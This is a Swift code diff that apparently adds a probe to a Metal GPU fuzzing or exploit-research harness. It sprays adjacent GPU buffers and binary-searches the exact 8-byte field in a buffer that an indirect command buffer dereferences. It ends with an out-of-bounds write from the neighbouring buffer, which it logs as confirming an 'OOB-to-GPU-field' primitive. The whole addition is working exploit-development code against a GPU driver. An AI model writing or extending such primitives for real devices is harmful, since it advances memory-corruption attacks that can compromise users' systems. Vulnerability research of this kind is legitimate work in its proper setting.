@@ -2794,3 +2794,187 @@ func runICBCorruption(log: FuzzLog, completion: @escaping () -> Void) {
         completion()
     })
 }
+
+// ── ICB Field Offset Probe ────────────────────────────────────────────────────
+// Binary-searches the exact 8-byte slot within hi that the GPU dereferences.
+// hi is all zeros normally; we write canaryVA to progressively smaller ranges
+// and execute the ICB each time — GPU fault → that range contains the live field.
+// Uses direct hi.contents() writes (we own hi) for probe; OOB via lo for final
+// demonstration. ~10 ICB executions total via binary search.
+func runICBFieldProbe(log: FuzzLog, completion: @escaping () -> Void) {
+    DispatchQueue.global(qos: .userInitiated).async(execute: {
+        let sl = SyncLog()
+        func step(_ s: String) { sl.write(s); log.append(s) }
+
+        step("── ICB Field Offset Probe (binary search) ──")
+        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ no device"); completion(); return }
+        guard let queue  = device.makeCommandQueue()       else { step("✗ no queue");  completion(); return }
+
+        let BUF_LEN = 4096
+        let canaryVA: UInt64 = 0xDEAD_C0DE_CAFE_0000
+
+        guard let sentinelBuf = device.makeBuffer(length: BUF_LEN, options: .storageModeShared),
+              let targetBuf   = device.makeBuffer(length: BUF_LEN, options: .storageModeShared) else {
+            step("✗ buf alloc failed"); completion(); return
+        }
+        sentinelBuf.contents().initializeMemory(as: UInt8.self, repeating: 0xBB, count: BUF_LEN)
+        targetBuf.contents().initializeMemory(as: UInt8.self,   repeating: 0xCC, count: BUF_LEN)
+        step("sentinelBuf gpuVA=0x\(String(sentinelBuf.gpuAddress,radix:16))")
+
+        let src = """
+        #include <metal_stdlib>
+        using namespace metal;
+        struct V { float4 pos [[position]]; };
+        vertex V vtx(uint id [[vertex_id]], const device float4* b [[buffer(0)]]) {
+            V o; o.pos = b[id]; return o; }
+        fragment float4 frg(V in [[stage_in]]) { return float4(1,0,0,1); }
+        """
+        guard let lib = try? device.makeLibrary(source: src, options: nil),
+              let vf  = lib.makeFunction(name: "vtx"),
+              let ff  = lib.makeFunction(name: "frg") else {
+            step("✗ shader failed"); completion(); return
+        }
+        let pd = MTLRenderPipelineDescriptor()
+        pd.vertexFunction = vf; pd.fragmentFunction = ff
+        pd.colorAttachments[0].pixelFormat = .bgra8Unorm
+        guard let pso = try? device.makeRenderPipelineState(descriptor: pd) else {
+            step("✗ PSO failed"); completion(); return
+        }
+
+        let icbDesc = MTLIndirectCommandBufferDescriptor()
+        icbDesc.commandTypes              = [.draw]
+        icbDesc.inheritBuffers            = false
+        icbDesc.maxVertexBufferBindCount  = 1
+        icbDesc.maxFragmentBufferBindCount = 0
+        guard let icb = device.makeIndirectCommandBuffer(descriptor: icbDesc,
+                                                          maxCommandCount: 1,
+                                                          options: .storageModeShared) else {
+            step("✗ ICB alloc failed"); completion(); return
+        }
+        let slot = icb.indirectRenderCommandAt(0)
+        slot.setRenderPipelineState(pso)
+        slot.setVertexBuffer(sentinelBuf, offset: 0, at: 0)
+        slot.drawPrimitives(.point, vertexStart: 0, vertexCount: 1, instanceCount: 1, baseInstance: 0)
+
+        // Find adjacent (lo, hi) — keep alive
+        var loRef: MTLBuffer? = nil
+        var hiRef: MTLBuffer? = nil
+        for _ in 0..<128 {
+            guard let a = device.makeBuffer(length: BUF_LEN, options: .storageModeShared),
+                  let b = device.makeBuffer(length: BUF_LEN, options: .storageModeShared) else { continue }
+            let lo = a.gpuAddress < b.gpuAddress ? a : b
+            let hi = a.gpuAddress < b.gpuAddress ? b : a
+            guard hi.gpuAddress == lo.gpuAddress &+ UInt64(BUF_LEN) else { continue }
+            loRef = lo; hiRef = hi
+            step("✓ pair: lo=0x\(String(lo.gpuAddress,radix:16)) hi=0x\(String(hi.gpuAddress,radix:16))")
+            break
+        }
+        guard let lo = loRef, let hi = hiRef else {
+            step("✗ spray miss after 128 pairs"); completion(); return
+        }
+
+        let q = hi.contents().assumingMemoryBound(to: UInt8.self)
+
+        // Helper: write canaryVA to hi[from..<to] (8B aligned range)
+        func fillHi(_ from: Int, _ to: Int) {
+            var off = from; while off < to { for bi in 0..<8 { q[off+bi] = UInt8((canaryVA >> (bi*8)) & 0xFF) }; off += 8 }
+        }
+        // Helper: clear hi[from..<to]
+        func clearHi(_ from: Int, _ to: Int) {
+            var off = from; while off < to { for bi in 0..<8 { q[off+bi] = 0 }; off += 8 }
+        }
+
+        // Helper: make a 1x1 render pass descriptor
+        func makeRTDesc() -> MTLRenderPassDescriptor? {
+            let td = MTLTextureDescriptor.texture2DDescriptor(pixelFormat: .bgra8Unorm,
+                                                              width: 1, height: 1, mipmapped: false)
+            td.usage = [.renderTarget]; td.storageMode = .shared
+            guard let tex = device.makeTexture(descriptor: td) else { return nil }
+            let rt = MTLRenderPassDescriptor()
+            rt.colorAttachments[0].texture = tex
+            rt.colorAttachments[0].loadAction = .clear
+            rt.colorAttachments[0].storeAction = .store
+            return rt
+        }
+
+        // Helper: execute ICB, return true if GPU faulted
+        func probeExec() -> Bool {
+            guard let rtDesc = makeRTDesc(),
+                  let cb  = queue.makeCommandBuffer(),
+                  let enc = cb.makeRenderCommandEncoder(descriptor: rtDesc) else { return false }
+            enc.executeCommandsInBuffer(icb, range: 0..<1)
+            enc.endEncoding()
+            cb.commit(); cb.waitUntilCompleted()
+            return cb.error != nil
+        }
+
+        // Sanity: baseline (hi = zeros) — should NOT fault
+        step("── baseline (hi=zeros) ──")
+        let baselineFault = probeExec()
+        step("  baseline: \(baselineFault ? "FAULT (unexpected)" : "OK — zeros are safe")")
+        if baselineFault {
+            step("  ✗ zeros in hi also fault — probe invalid, aborting")
+            completion(); return
+        }
+
+        // Verify full-flood still faults (confirm primitive is live)
+        step("── full-flood verify ──")
+        fillHi(0, BUF_LEN)
+        let fullFault = probeExec()
+        clearHi(0, BUF_LEN)
+        step("  full flood: \(fullFault ? "FAULT ✓ — primitive confirmed" : "OK (no fault?!)")")
+        if !fullFault {
+            step("  ✗ full flood no longer faults — GPU layout changed, aborting")
+            completion(); return
+        }
+
+        // Binary search: narrow to exact 8-byte slot
+        step("── binary search ──")
+        var searchLo = 0
+        var searchHi = BUF_LEN
+        var iteration = 0
+        while searchHi - searchLo > 8 {
+            iteration += 1
+            let mid = ((searchLo + searchHi) / 2) & ~7  // align to 8
+            // Test lower half [searchLo, mid)
+            fillHi(searchLo, mid)
+            let loFault = probeExec()
+            clearHi(searchLo, mid)
+            step("  iter \(iteration): [0x\(String(format:"%x",searchLo))..0x\(String(format:"%x",mid))) → \(loFault ? "FAULT" : "ok")")
+            if loFault {
+                searchHi = mid
+            } else {
+                searchLo = mid
+            }
+            if iteration > 20 { step("  ✗ too many iterations — aborting"); break }
+        }
+
+        let foundOff = searchLo
+        step("── result ──")
+        step("✓ active GPU field @ hi[+0x\(String(format:"%x",foundOff))] (hi gpuVA=0x\(String(hi.gpuAddress,radix:16))+0x\(String(format:"%x",foundOff)))")
+        step("  absolute GPU VA read by GPU: 0x\(String(hi.gpuAddress + UInt64(foundOff),radix:16))")
+
+        // Confirm: single 8-byte write at foundOff faults
+        fillHi(foundOff, foundOff + 8)
+        let singleFault = probeExec()
+        clearHi(foundOff, foundOff + 8)
+        step("  single 8B @ +0x\(String(format:"%x",foundOff)): \(singleFault ? "FAULT ✓ confirmed" : "ok (probe mismatch?)")")
+
+        // Dump 16 bytes around the found field for structure context
+        step("  hi[+0x\(String(format:"%x",max(0,foundOff-8)))..+0x\(String(format:"%x",min(BUF_LEN,foundOff+16)))] (baseline zeros context):")
+        var ctxHex = ""
+        for i in max(0, foundOff - 8)..<min(BUF_LEN, foundOff + 16) { ctxHex += String(format: "%02x ", q[i]) }
+        step("  \(ctxHex)")
+
+        // OOB write via lo adjacency demonstration at the confirmed offset
+        step("── OOB via lo adjacency at confirmed field ──")
+        let p = lo.contents().assumingMemoryBound(to: UInt8.self)
+        for bi in 0..<8 { p[BUF_LEN + foundOff + bi] = UInt8((canaryVA >> (bi*8)) & 0xFF) }
+        step("  OOB[lo+0x\(String(format:"%x",BUF_LEN+foundOff))] ← canaryVA=0x\(String(canaryVA,radix:16))")
+        let oobFault = probeExec()
+        step("  OOB exec: \(oobFault ? "FAULT ✓ — OOB-to-GPU-field confirmed" : "ok")")
+
+        step("── ICB Field Probe complete ──────────────")
+        completion()
+    })
+}
